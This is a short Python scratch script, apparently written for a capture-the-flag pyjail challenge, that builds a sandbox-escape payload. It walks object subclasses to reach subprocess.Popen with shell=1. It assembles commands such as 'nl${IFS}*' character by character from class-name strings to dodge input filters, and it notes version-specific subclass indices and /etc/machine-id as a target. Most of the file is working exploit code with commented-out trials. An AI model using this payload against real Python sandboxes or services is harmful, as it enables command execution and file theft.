import string
# python:3.8 vuln in 132
# python:3.9 vuln in 133, 134
# python:3.10 vuln in 139

# c = (().__class__.__base__.__subclasses__().pop(139).__enter__.__globals__)
c = ().__class__.__base__.__subclasses__().pop(134).__init__.__globals__
# c = (*(().__class__.__base__.__subclasses__().pop(132).__enter__.__globals__.values()),)
# ss = c.__getitem__(1)
# ss = ().__class__
# a = c.__getitem__(277).__str__().__getitem__(1)
# exploit = "/etc/machine-id"
excat = "nl"
exid = "nl${IFS}*"

# /etc/machine-id
space = "().__class__.__str__(().__class__).__getitem__(6)"

ss = ().__class__.__str__(().__class__)

payload = lambda string: f"(*().__class__.__base__.__subclasses__(),).__getitem__(394)({string},stdout=-1,shell=1).communicate()"
# payload = lambda string: f"(*(*(().__class__.__base__.__subclasses__().pop(133).__init__.__globals__.values()),).__getitem__(-5)({string}),)"
main = lambda ss, ex, obj: "+".join([f"{obj}.__getitem__({ss.find(i)})" for i in ex])
cat = main(ss, excat,'().__class__.__str__(().__class__)')
print(cat)
# ss = (().__class__.__base__.__subclasses__().pop(134).__init__.__globals__).__str__().__getitem__(20229)
# star = main(ss, '*','(().__class__.__base__.__subclasses__().pop(133).__enter__.__globals__).__str__()')
# print(ss[20229])

# print(payload(f"{cat}+{space}+(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__).__str__().__getitem__(35204)"))

# print(cat)
# machine = ""


    # if j:
    #     if a in str(j):
    #         print(i, j )
    #         exit()

# for j,i in enumerate(c):
#     if i:
#         # print(a in str(i))
#         if a in str(i) :
#             print(i)
#             print(j)
            # exit()
# filter()
# [for i in ]
# (43)+(45)
# y = lambda x: {i:j for i,j in enumerate(s.split(" "))}
# print(y())
# filter()
# f = filter(lambda x: x in string.printable,[i for i in s])
# print(list(f))